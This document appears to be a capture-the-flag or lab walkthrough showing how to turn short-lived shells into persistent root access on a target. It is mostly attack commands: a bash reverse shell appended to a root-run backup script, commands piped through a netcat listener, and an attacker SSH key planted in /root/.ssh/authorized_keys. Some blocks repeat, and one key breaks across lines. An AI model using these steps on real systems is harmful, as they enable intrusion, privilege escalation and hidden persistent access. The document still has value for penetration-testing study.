## Exploiting Short-Lived Shells for Persistent Access

### Introduction
In this scenario, we leverage short-lived shells to establish persistent access on a target system. We utilize a combination of techniques, including modifying scripts and employing netcat listeners, to achieve our objective.

### Setting Up Initial Access
To initiate the process, we start a simple HTTP server and monitor ICMP traffic on a specified network interface.

```bash
python -m http.server 80
sudo tcpdump -ni tun0 icmp
```

### Locating Relevant Services
We search for specific systemd services related to backup operations on the target system.

```bash
find /etc/systemd/ -name timer_backup.service
find /etc/systemd/ -name web_backup.service
```
## Gaining root access

``` 
echo -e '\nbash -i >& /dev/tcp/10.10.14.55/443 0>&1' >> /usr/bin/timer_backup.sh
```

### Scripting Commands for Short-Lived Shells
In scenarios where only short-lived shells are available, we script commands to run on the shell and echo them into a netcat listener.

**On our machine**
```bash
echo 'mkdir -p /root/.ssh && echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing" >> /root/.ssh/authorized_keys' | sudo nc -lnvp 443
```

### Establishing Persistent Access
By executing the scripted commands through the netcat listener, we create the necessary directory and add an SSH public key to the authorized_keys file, ensuring persistent access.

```bash
echo -e '\nmkdir -p /root/.ssh\necho "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing" >> /root/.ssh/authorized_keys'  >> /usr/bin/timer_backup.sh
```

```bash
mkdir -p /root/.ssh
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing" >> /root/.ssh/authorized_keys
```

```bash
echo 'mkdir -p /root/.ssh && echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58Q
vP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing" >> /root/.ssh/authorized_keys' | sudo nc -lnvp 443
```

### Verifying Access
Upon successful execution, we can verify persistent access by connecting to the target system via SSH using the provided SSH key.

```bash
ssh -i ~/keys/ed25519_gen root@10.10.10.214
```

### Conclusion
Utilizing a combination of scripting techniques and netcat listeners, we successfully establish persistent access on the target system, demonstrating the effectiveness of exploiting short-lived shells for maintaining access.
